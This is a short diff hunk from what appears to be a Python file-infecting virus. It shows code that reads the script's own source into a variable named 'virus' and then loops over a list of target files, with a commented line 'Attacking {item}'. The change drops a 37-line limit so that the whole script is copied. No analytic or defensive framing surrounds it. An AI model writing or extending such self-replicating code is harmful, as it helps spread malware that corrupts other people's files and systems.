@@ -113,7 +113,7 @@ while True:
                         file_list.append(line.strip())
 
                     IN = open(sys.argv[0], 'r')
-                    virus = [line for (i,line) in enumerate(IN) if i < 37]
+                    virus = [line for (i,line) in enumerate(IN)]
 
                     for item in file_list:
                         # print(f"Attacking {item}")
